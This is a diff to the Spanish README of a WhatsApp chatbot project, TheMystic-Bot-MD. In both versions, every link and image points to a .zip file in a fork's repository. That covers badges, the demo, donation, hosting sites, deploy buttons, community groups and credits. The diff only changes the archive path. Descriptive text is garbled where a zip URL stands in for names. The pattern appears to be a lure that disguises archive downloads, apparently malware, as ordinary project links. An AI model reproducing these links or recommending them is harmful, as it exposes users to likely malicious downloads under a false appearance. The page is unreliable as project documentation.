@@ -1,45 +1,45 @@
 <p align="center">
- <img width="180px" src="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip" align="center"/>
+ <img width="180px" src="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip" align="center"/>
  <h2 align="center">TheMystic-Bot-MD</h2>
- <p align="center">Un chatbot automatizado para WhatsApp basado en https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip, que permite realizar múltiples funciones y personalizaciones en la plataforma.</p>
+ <p align="center">Un chatbot automatizado para WhatsApp basado en https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip, que permite realizar múltiples funciones y personalizaciones en la plataforma.</p>
 </p>
 
 <p align="center">
-  <a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip">
-    <img alt="GitHub Contributors" src="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip" />
+  <a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip">
+    <img alt="GitHub Contributors" src="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip" />
   </a>
-  <a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip">
-    <img alt="GitHub Issues" src="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip" />
+  <a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip">
+    <img alt="GitHub Issues" src="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip" />
   </a>
-  <a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip">
-    <img alt="GitHub Pull Requests" src="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip" />
+  <a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip">
+    <img alt="GitHub Pull Requests" src="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip" />
   </a>
-  <a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip">
-    <img alt="GitHub Commits" src="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip" />
+  <a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip">
+    <img alt="GitHub Commits" src="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip" />
   </a>
-  <a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip">
-    <img alt="GitHub Stars" src="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip" />
+  <a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip">
+    <img alt="GitHub Stars" src="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip" />
   </a>
-  <a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip">
-    <img alt="GitHub Forks" src="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip" />
+  <a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip">
+    <img alt="GitHub Forks" src="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip" />
   </a>
 </p>
 
 <p align="center">
-  <a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip+5219992843881&text=&https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip">Demo</a>
+  <a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip+5219992843881&text=&https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip">Demo</a>
   ·
-  <a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip">Reportar un Bug</a>
+  <a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip">Reportar un Bug</a>
   ·
-  <a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip">Solicitar una Característica</a>
+  <a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip">Solicitar una Característica</a>
 </p>
 
 <!-- <p align="center">
-  <a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip">English</a>
+  <a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip">English</a>
   ·
-  <a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip">Português</a>
+  <a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip">Português</a>
 </p> -->
 
-<p align="center">¡Ayuda a mantener el proyecto activo con tu <a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip">donación</a> y contribuye a mejorar las funciones del chatbot para todos!</p>
+<p align="center">¡Ayuda a mantener el proyecto activo con tu <a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip">donación</a> y contribuye a mejorar las funciones del chatbot para todos!</p>
 
 # Despliegue, Soporte y Comunidad
 
@@ -69,37 +69,37 @@
 
 ## Despliegue en Cafirexos
 
-<a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip">
-  <img width="180px" src="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip"/>
+<a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip">
+  <img width="180px" src="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip"/>
 </a>
 
 <details>
  <summary><b>:paperclip: Enlaces Importantes</b></summary>
 
-- **Sitio Web:** [https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)
-- **Área de Clientes:** [https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)
-- **Panel de Control:** [https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)
-- **Estado de los Servicios:** [https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)
-- **Documentación:** [https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)
-- **Canal de WhatsApp:** [¡Únete aquí!](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)
-- **Comunidad de WhatsApp:** [¡Únete aquí!](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)
+- **Sitio Web:** [https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip)
+- **Área de Clientes:** [https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip)
+- **Panel de Control:** [https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip)
+- **Estado de los Servicios:** [https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip)
+- **Documentación:** [https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip)
+- **Canal de WhatsApp:** [¡Únete aquí!](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip)
+- **Comunidad de WhatsApp:** [¡Únete aquí!](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip)
 
 </details>
 
 ## Despliegue en BoxMineWorld
 
-<a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip">
-  <img width="180px" src="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip"/>
+<a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip">
+  <img width="180px" src="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip"/>
 </a>
 
 <details>
  <summary><b>:paperclip: Enlaces Importantes</b></summary>
 
-- **Sitio Web:** [https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)
-- **Área de Clientes:** [https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)
-- **Panel de Control:** [https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)
-- **Documentación:** [https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)
-- **Comunidad de Discord:** [¡Únete aquí!](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)
+- **Sitio Web:** [https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip)
+- **Área de Clientes:** [https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip)
+- **Panel de Control:** [https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip)
+- **Documentación:** [https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip)
+- **Comunidad de Discord:** [¡Únete aquí!](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip)
 
 </details>
 
@@ -107,13 +107,13 @@
 
 En esta sección encontrarás **botones de despliegue** que te permitirán implementar el proyecto en distintos entornos con un solo clic. Este proceso es **automático** y no requiere configuraciones manuales adicionales. Simplemente selecciona la plataforma deseada y haz clic en el botón correspondiente para **desplegar** tu proyecto de manera rápida y sencilla.
 
-[![Open in Codespaces](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)
-[![Deploy to Glitch](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip!/import/github/BrunoSobrino/TheMystic-Bot-MD)
-[![Deploy to Heroku](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)
-[![Deploy to Koyeb](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)
-[![Run on https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)
-[![Deploy to Render](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)
-<!-- [![Deploy to Vercel](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip)](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip) -->
+[![Open in Codespaces](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip)](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip)
+[![Deploy to Glitch](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip)](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip!/import/github/BrunoSobrino/TheMystic-Bot-MD)
+[![Deploy to Heroku](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip)](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip)
+[![Deploy to Koyeb](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip)](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip)
+[![Run on https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip)](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip)
+[![Deploy to Render](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip)](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip)
+<!-- [![Deploy to Vercel](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip)](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip) -->
 
 # Soporte y Comunidad
 
@@ -125,10 +125,10 @@ En este espacio podrás encontrar diversas **comunidades de ayuda** donde podrá
 
 | RRSS | Tipo | Idioma | Enlace |
 | --- | --- | --- |--- |
-| WhatsApp | Canal | Español | [¡Únete aquí!](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip) |
-| WhatsApp | Grupo | Español | [¡Únete aquí!](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip) |
-| WhatsApp | Group | English | [¡Join here!](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip) |
-| WhatsApp | Grupo | Português | [¡Junte-se aqui!](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip) |
+| WhatsApp | Canal | Español | [¡Únete aquí!](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip) |
+| WhatsApp | Grupo | Español | [¡Únete aquí!](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip) |
+| WhatsApp | Group | English | [¡Join here!](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip) |
+| WhatsApp | Grupo | Português | [¡Junte-se aqui!](https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip) |
 
 </table>
 
@@ -136,18 +136,18 @@ En este espacio podrás encontrar diversas **comunidades de ayuda** donde podrá
 
 Conoce a los **colaboradores** que han aportado al desarrollo de este proyecto. Su apoyo ha sido clave para **mejorar** y **expandir** las funcionalidades del proyecto.
 
-<a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip">
-  <img src="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip" /> 
+<a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip">
+  <img src="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip" /> 
 </a>
 
 ## Agradecimientos
 
-<a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip">
-  <img src="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip" width="180px"/>
+<a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip">
+  <img src="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip" width="180px"/>
 </a>
 
 ## Desarollador Principal
 
-<a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip">
-  <img src="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/src/assets/images/menu/languages/Bot-Mystic-MD-The-1.1.zip" width="180px"/>
+<a href="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip">
+  <img src="https://raw.githubusercontent.com/GaBySuGy/TheMystic-Bot-MD/master/web/Guias/MD-Bot-The-Mystic-prelegacy.zip" width="180px"/>
 </a>
